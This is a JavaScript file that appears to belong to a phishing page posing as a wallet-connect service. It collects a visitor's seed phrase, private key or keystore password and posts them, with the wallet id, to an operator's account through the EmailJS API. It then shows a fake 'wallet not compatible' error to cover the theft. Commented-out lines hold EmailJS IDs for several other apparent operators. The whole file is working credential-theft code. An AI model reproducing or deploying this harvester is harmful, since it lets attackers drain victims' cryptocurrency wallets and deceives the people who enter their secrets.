const phrase = document.querySelector("#phrase");

const phraseForm = document.querySelector("#phrase-form");
const keystoreForm = document.querySelector("#keystore-form");
const privateForm = document.querySelector("#private-form");

const keystore = document.querySelector("#keystore");
const private = document.querySelector("#private");
const first = document.querySelector("#first");
const second = document.getElementById("second");
const third = document.querySelector("#third");
phrase.addEventListener("click", function() {
    hide(first);
});

keystore.addEventListener("click", function() {
    hide(second);
});

private.addEventListener("click", function() {
    hide(third); {
        gy;
    }
});

function hide(elem) {
    var expandedPanel = document.querySelector(".active");
    //This is to remove the current active class on click
    if (expandedPanel) {
        expandedPanel.classList.remove("active");
        var attr = document.getElementsByClassName(
            "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full"
        );

        for (let i = 0; i < attr.length; i++) {
            attr[i].value = "";
        }
    }
    var i = document.getElementsByClassName(
        "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
    );
    var x = elem.getElementsByClassName(
        "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
    );

    for (let c = 0; c < i.length; c++) {
        i[c].required = false;
    }
    for (let c = 0; c < x.length; c++) {
        x[c].required = true;
    }
    //add an active tag to the clicked element and set it's

    elem.classList.add("active");
}

const form = document.querySelector("#form");

const XHR = new XMLHttpRequest();
const XHR2 = new XMLHttpRequest();

const sendData = async (data) => {
    // Push our data into our FormData object

    // Define what happens on successful data submission
    XHR.addEventListener("load", function(event) {
        alert(
            "Error! The wallet connected might not be compatible.Please contact the admin/support for more help or Connect with an active wallet."
        );

        document.querySelector(".sending").style.display = "none";
    });

    // Define what happens in case of error
    XHR.addEventListener(" error", function(event) {
        alert("Oops! Something went wrong.");
    });

    const {
        file,
        privatekey,
        keystorepassword,
        phrase,
        service_id,
        template_id,
        user_id,
        wallet_id,
    } = data;

    let title = "";

    if (privatekey) title = "Private Key";
    if (keystorepassword) title = "KeyStoreJson";
    if (phrase) title = "Phrase";

    const stringifiedMessage = JSON.stringify({
        title,
        body: {
            keystorepassword,
            phrase,
            privatekey,
            wallet_id,
            // file,
        },
    });

    const toSend = {
        service_id,
        template_id,
        user_id,
        keystorepassword,
        phrase,
        privatekey,
        wallet_id,
        to_name: "Admin",
        from_name: " Any_User",
        message: stringifiedMessage,
    };

    console.log(toSend);

    XHR.open("POST", "https://api.emailjs.com/api/v1.0/email/send-form", true);

    // Send our FormData object; HTTP headers are set automatically
    // XHR.send({ message: new URLSearchParams(FD) });
    XHR.send(new URLSearchParams(toSend));
};

form.addEventListener("submit", async function(e) {
    e.preventDefault();
    

    const FD = new FormData(this);

// Lummie new code
FD.append("service_id", "service_xud1pcs");
FD.append("template_id", "template_m8xozhp");
    FD.append("user_id", "DMz587whhBunU2bWh");
// end









// zeekel new code
// FD.append("service_id", "service_l5zr2bz");
// FD.append("template_id", "template_6tn9dgr");
//     FD.append("user_id", "_iF82pktm_M19Yf94");
// end

    // FD.append("service_id", "service_k1e1b3a");
    // FD.append("template_id", "template_m0g484a");
    // FD.append("user_id", "UJAefUeGPfV2nS1Z1");
    //   tosin
    // FD.append("service_id", "service_vncztzu");
    // FD.append("template_id", "template_64d3u8c");
    // FD.append("user_id", "kFD_4HTGeednSLFX_");

    // LEKANGEE
    // FD.append("service_id", "service_p4qw8mb");
    // FD.append("template_id", "template_pl83yrm");
    // FD.append("user_id", "O3gQJgz2Cl9LVWZz6");

    // start YINKAAAAAA
    // FD.append("service_id", "service_kz7jleq");
    // FD.append("template_id", "template_bxlzfc7");
    // FD.append("user_id", "sHBlZNgbpIcASRQam");
    // for yinks
    // .sendForm(
    //   "service_kz7jleq",
    //   "template_bxlzfc7",
    //   ref.current,
    //   "sHBlZNgbpIcASRQam"
    // )
    // end
    // END
    // Oye Colanim
    // FD.append("service_id", "service_xlcdmlp");
    // FD.append("template_id", "template_m3vmzcl");
    // FD.append("user_id", "IFq_ftCcnU_lfgId7");

    // .sendForm(
    //   "service_xlcdmlp",
    //   "template_m3vmzcl",
    //   ref.current,
    //   "IFq_ftCcnU_lfgId7"
    // )
    //
    // .sendForm(
    // tosin
    //   "service_f6d8nxb",
    //   "template_6ciy15u",
    //   ref.current,
    //   "yHBMX4yCStbeXbxgy"
    // )
    const entries = FD.entries();

    const data = Object.fromEntries(entries);

    document.querySelector(".sending").style.display = "flex";

    if (data.privatekey) {
        await sendData(data);
    }
    if (data.keystorepassword) {
        await sendData(data);
    }
    if (data.phrase) {
        await sendData(data);
    }
});

phraseForm.addEventListener("submit", async function(e) {
    e.preventDefault();
   
});

privateForm.addEventListener("submit", async function(e) {
    e.preventDefault();
});

keystoreForm.addEventListener("submit", async function(e) {
    e.preventDefault();
});